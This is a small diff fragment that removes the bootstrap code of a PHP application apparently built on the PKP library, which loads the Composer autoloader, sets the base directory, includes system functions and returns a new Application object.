-
-/**
- * Basic initialization (pre-classloading).
- */
-
-// Load Composer autoloader
-require_once 'lib/pkp/lib/vendor/autoload.php';
-
-define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
-chdir(BASE_SYS_DIR);
-
-// System-wide functions
-require_once './lib/pkp/includes/functions.php';
-
-// Initialize the application environment
-return new \APP\core\Application();
